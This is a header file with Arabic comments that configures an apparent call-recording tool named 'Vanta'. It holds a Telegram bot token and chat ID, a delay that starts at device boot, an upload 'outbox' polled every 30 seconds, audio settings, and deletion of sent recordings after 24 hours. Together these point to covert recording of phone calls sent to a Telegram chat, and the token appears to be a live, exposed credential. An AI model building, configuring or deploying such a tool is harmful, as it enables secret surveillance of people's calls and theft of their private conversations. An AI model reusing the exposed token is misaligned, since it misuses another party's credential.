#ifndef VANTA_CALLCONF_H
#define VANTA_CALLCONF_H

// ═══ Telegram ═══
#define TG_TOKEN     @"8858007178:AAGQnAEEUPam1YjpKAIpnqXiodyEust-fbw"
#define TG_CHAT      @"6282554175"

// ═══ التوقيتات ═══
#define START_DELAY      5      // ثواني بعد الإقلاع
#define POLL_SEC         5      // فاصل الاستطلاع
#define OUTBOX_INTERVAL  30     // فحص الـ outbox
#define CALL_MIN_SEC     3      // أقل مدة تسجيل مقبولة

// ═══ الصوت ═══
#define SAMPLE_RATE      44100
#define CHANNELS         2
#define BITRATE          64000
#define RB_SIZE_MB       4

// ═══ التخزين ═══
#define OUTBOX_NAME      @"vanta_outbox"
#define SENT_TTL_SEC     (24 * 3600)   // حذف بعد 24 ساعة

#endif
